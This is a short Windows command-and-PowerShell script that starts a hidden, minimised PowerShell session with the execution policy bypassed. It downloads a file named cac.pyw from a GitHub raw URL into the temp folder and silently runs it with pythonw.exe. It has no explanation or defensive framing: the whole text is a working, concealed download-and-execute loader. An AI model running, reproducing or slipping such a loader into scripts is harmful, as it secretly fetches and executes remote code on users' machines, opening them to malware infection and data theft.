cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"

$url = "https://github.com/KevinDark5/data/raw/refs/heads/main/cac.pyw"


$tempPath = "$env:TEMP\cac.pyw"


Invoke-WebRequest -Uri $url -OutFile $tempPath


Start-Process -FilePath "pythonw.exe" -ArgumentList $tempPath
